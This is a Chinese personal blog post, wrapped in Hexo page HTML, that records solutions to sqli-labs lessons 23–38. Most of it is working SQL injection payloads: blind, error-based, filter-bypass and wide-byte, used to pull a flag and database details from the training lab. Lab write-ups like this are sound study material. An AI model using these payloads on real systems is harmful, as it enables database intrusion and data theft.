@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.1"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><meta name="keywords" content="null"><meta name="description" content="学生"><meta name="author" content="Katharsis"><title>sqli_labs通关记录（二） - Kath4rs1s</title><meta description="学生"><meta property="og:type" content="article"><meta property="og:title" content="sqli_labs通关记录（二）"><meta property="og:url" content="http://yoursite.com/2020/08/02/sqli-labs-2/"><meta property="og:site_name" content="Katharsis"><meta property="og:description" content="学生"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2020-08-02T15:27:33.000Z"><meta property="article:modified_time" content="2020-08-03T11:19:16.204Z"><meta property="article:author" content="Katharsis"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://yoursite.com/img/avatar.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2020/08/02/sqli-labs-2/"},"headline":"sqli_labs通关记录（二）","image":["http://yoursite.com/img/avatar.png"],"datePublished":"2020-08-02T15:27:33.000Z","dateModified":"2020-08-03T11:19:16.204Z","author":{"@type":"Person","name":"Katharsis"},"description":"学生"}</script><link rel="alternative" href="/atom.xml" title="Kath4rs1s" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><link rel="stylesheet" href="/css/style.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/123456.png" alt="Kath4rs1s" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2020-08-02  <span class="level-item"><i class="far fa-clock"> </i>2 m  <i class="fas fa-pencil-alt"> </i>0.4 k</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span> visits</span></div></div><h1 class="title is-3 is-size-4-mobile">sqli_labs通关记录（二）</h1><div class="content"><p>[TOC]</p>
+<h1 id="Page-2-Adv-Injections"><a href="#Page-2-Adv-Injections" class="headerlink" title="Page-2 (Adv Injections)"></a>Page-2 (Adv Injections)</h1><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>time-based blind:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?id&#x3D;1&#39;and if(ord(mid((select flag from ctftraining.flag),1,1))&gt;101,sleep(3),1) or &#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>二次注入</p>
+<h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">?id&#x3D;1&#39; anandd 1&#x3D;1 anandd &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h2><p>boolean-based blind</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 anandd ascii(mid((select flag from ctftraining.flag),1,1))&gt;103 %23</span><br></pre></td></tr></table></figure>
+<p>time-based blind</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 anandd if(length(database())&gt;1,sleep(3),1) %23</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>报错注入，之前做过的原题，空格过滤用括号代替，or,and双写绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;^updatexml(1,concat(0x7e,(select(right(flag,30))from(ctftraining.flag)),0x7e),1)^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>Boolean-based blind,过滤情况和26一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;^ascii(mid((select(flag)from(ctftraining.flag)),1,1))&gt;102^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>过滤了空格，注释符，union,select 使用大小写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;%0aunIon%0aselEct%0a1,database(),3%0aor%0a&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><figure class="highlight plain"><figcaption><span>select```查询，和27一样</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">?id&#x3D;0&quot;%0auniOn%0aseLecT%0a1,database(),3%0aor%0a&#39;1&#39;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>Boolean-based blind</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||ascii(mid((selECt%0aflag%0afrom%0actftraining.flag),1,1))&gt;102^&#39;1&#39;&#x3D;&#39;0</span><br></pre></td></tr></table></figure>
+<p>union select</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%27)%0aunion%0aall%0aselect%0a1,(select%0aflag%0afrom%0actftraining.flag%0a%0alimit%0a0,1),3%0aor%0a(%271%27&#x3D;%270</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>Boolean-based blind</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;^ ascii(mid((select group_concat(flag) from ctftraining.flag),1,1))&gt;102 or &#39;1&#39;&#x3D;&#39;0</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><p>time-based blind</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%27%20and%20(select(sleep(2-if(ord(mid((select flag from ctftraining.flag),1,1))&gt;102,0,2))))%20and%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>Boolean-based blind</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;and ord(mid((select flag from ctftraining.flag),1,1))&gt;101 and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;)and ord(mid((select flag from ctftraining.flag),1,1))&gt;101 and (&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>宽字节注入，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27 union select 1,user(),3 -- +</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>宽字节</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27 union select 1,database(),3 -- +</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>宽字节</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df&#39; union select 1,(select flag from ctftraining.flag)%23&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,database(),3 -- +</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>和33一样</p>
+<h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>一样</p>
+<h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>一样</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>几十道题都是一样的，没什么营养，掌握几个payload就可以一直用，也学不到什么东西，刷的我好累，休息一阵子再刷后面的吧。</p>
+</div><ul class="post-copyright"><li><strong>Post Title: </strong><a href="http://yoursite.com/2020/08/02/sqli-labs-2/">sqli_labs通关记录（二）</a></li><li><strong>Post Author: </strong><a href="http://yoursite.com">John Doe</a></li><li><strong>Post Link: </strong><a href="http://yoursite.com/2020/08/02/sqli-labs-2/">http://yoursite.com/2020/08/02/sqli-labs-2/</a></li><li><strong>Copyright Notice: </strong><span>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></li></ul><div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># Related Post</span><br><span>  1.<a class="is-size-6" href="/2020/07/31/sqli-labs/" target="_blank">sqli_labs通关记录（一）</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/07/31/sqli-labs/"><span class="level-item">sqli_labs通关记录（一）</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget toc-scroll" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-Page-2-Adv-Injections" href="#Page-2-Adv-Injections"><span>Page-2 (Adv Injections)</span></a><ul class="menu-list toc"><li><a class="is-flex toc-item" id="toc-item-less-23" href="#less-23"><span>less-23</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-24" href="#less-24"><span>less-24</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-25" href="#less-25"><span>less-25</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-25a" href="#less-25a"><span>less-25a</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-26" href="#less-26"><span>less-26</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-26a" href="#less-26a"><span>less-26a</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-27" href="#less-27"><span>less-27</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-27a" href="#less-27a"><span>less-27a</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-28" href="#less-28"><span>less-28</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-28a" href="#less-28a"><span>less-28a</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-29" href="#less-29"><span>less-29</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-30" href="#less-30"><span>less-30</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-31" href="#less-31"><span>less-31</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-32" href="#less-32"><span>less-32</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-33" href="#less-33"><span>less-33</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-34" href="#less-34"><span>less-34</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-35" href="#less-35"><span>less-35</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-36" href="#less-36"><span>less-36</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-37" href="#less-37"><span>less-37</span></a></li><li><a class="is-flex toc-item" id="toc-item-less-38" href="#less-38"><span>less-38</span></a></li></ul></li><li><a class="is-flex toc-item" id="toc-item-总结" href="#总结"><span>总结</span></a></li></ul></div></div><script type="text/javascript" async>
+        $(document).ready(function () { //参考自 https://github.com/ppoffice/hexo-theme-icarus/pull/616/files
+            var observerTopMargin;
+            var scrollObserver;
+            var headerElems = $(".headerlink");
+            var activeTocItem;
+        
+            function initIntersectionObserver(docHeight) {
+                observerTopMargin = docHeight;
+                scrollObserver = new IntersectionObserver(scrollCallBack,
+                    {
+                        root: null,  // viewpoint
+                        rootMargin: docHeight + "px 0px -80% 0px"  // cover top 30% of viewport to the top of document
+                    })
+            }
+        
+            function scrollCallBack(entries, observer) {
+                if ($(window).scrollTop() > observerTopMargin * 0.7) { 
+                    // User somehow scroll to 70% of observerTopMargin (which is inited as 200% document height)
+                    // Observer top margin need to extend to cover all the space to the top of the document
+                    initIntersectionObserver(observerTopMargin * 2)
+                    observer.disconnect();
+                    return;
+                }
+                let toActive;
+                if (entries[0].intersectionRatio == 1) {  // enter viewed area
+                    let entry = entries.reduce((u, v) => (u.target.toc_id > v.target.toc_id ? u : v));  // get the lowest item
+                    toActive = $("#toc-item-" + $(entry.target).attr("href").substr(1));
+                } else {
+                    let entry = entries.reduce((u, v) => (u.target.toc_id < v.target.toc_id ? u : v));  // get the highest item
+                    let idx = Math.max(entry.target.toc_id - 1, 0);
+                    toActive = $("#toc-item-" + $(headerElems[idx]).attr("href").substr(1));
+                }
+                if (activeTocItem) activeTocItem.removeClass("is-current");
+                activeTocItem = toActive
+                activeTocItem.addClass("is-current");
+            }
+        
+            initIntersectionObserver($(document).height() * 2);
+            headerElems.each(function (index, obj) {
+                obj.toc_id = index;
+                scrollObserver.observe(obj);
+            })
+        });</script></div><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="" src="/img/avatar.png" alt="Katharsis"></figure><p class="title is-size-4 is-block line-height-inherit">Katharsis</p><p class="is-size-6 is-block">^_^</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">3</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tag</p><a href="/tags"><p class="title">1</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="/" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="/null"><i></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Weibo" href="/null"><i></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Email" href="/null"><i></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Next" href="/null"><i></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="/null"><i></i></a></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/123456.png" alt="Kath4rs1s" height="28"></a><p class="size-small"><span>&copy; 2020 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>,Modify by <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">removeif</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
+            var n = new Date(time);
+            now.setTime(now.getTime() + 250),
+                days = (now - n) / 1e3 / 60 / 60 / 24,
+                dnum = Math.floor(days),
+                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
+                hnum = Math.floor(hours),
+            1 == String(hnum).length && (hnum = "0" + hnum),
+                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
+                mnum = Math.floor(minutes),
+            1 == String(mnum).length && (mnum = "0" + mnum),
+                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
+                snum = Math.round(seconds),
+            1 == String(snum).length && (snum = "0" + snum),
+                document.getElementById("statistic-times").innerHTML = "❤️Site from <strong>"+time.split(" ")[0].replace(/\//g,".")+"</strong> has existed <strong>" + dnum + "</strong> d <strong>" + hnum + "</strong> h <strong>" + mnum + "</strong> m <strong>" + snum + "</strong> s！❤️";
+        }var now = new Date();setInterval("createTime('2020/7/11 00:00:00')", 250,"");</script><br></span><div class="size-small"><span>❤️Thx <strong><span id="busuanzi_value_site_uv">99+</span></strong> users <strong><span id="busuanzi_value_site_pv">99+</span></strong> visited！❤️</span></div></p></div><div class="level-end"><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="4978492128" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            site: {
+                url: 'http://yoursite.com',
+                external_link: {"enable":true,"exclude":[]}
+            },
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to Top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back-to-top.js" defer></script><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.12/js/lightgallery-all.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><!--!--><!--!--><!--!--><script src="/js/toc.js" defer></script><script src="/js/main.js" defer></script><link rel="stylesheet" href="/css/insight.css"><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>(function (window) {
+            var INSIGHT_CONFIG = {
+                TRANSLATION: {
+                    POSTS: 'Posts',
+                    PAGES: 'Pages',
+                    CATEGORIES: 'Categories',
+                    TAGS: 'Tags',
+                    UNTITLED: '(Untitled)',
+                },
+                CONTENT_URL: '/content.json',
+            };
+            window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+        })(window);</script><script src="/js/insight.js" defer></script></body></html>
